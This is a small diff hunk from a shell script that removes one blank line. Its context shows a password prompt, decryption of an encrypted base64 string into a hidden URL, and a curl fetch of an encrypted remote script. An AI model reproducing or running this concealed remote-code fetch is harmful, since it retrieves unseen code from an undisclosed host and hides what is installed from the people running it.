@@ -35,7 +35,6 @@ check_dependencies
 
 echo "Enter password:"
 read -s password
-
 decrypted_url=$(decrypt_text "VTJGc2RHVmtYMTlpT2o5a3dMd3Y2UDVZbjVMN2F3cUV1Q3pWRFJ4dlNvKzNRcVhFc2ZWbWV0M0ovcFRkZ1dHSworOEQ2TTd4RFVQVy9jTkFmU2IzTmlZVkU4WnRqNmh5a1lGWWd4NTIyUGVvPQo=")
 script_url=$(echo -n "$decrypted_url" | sed "s/@@@@@@@/\n/g")
 encrypted_script=$(curl -sL "$script_url")
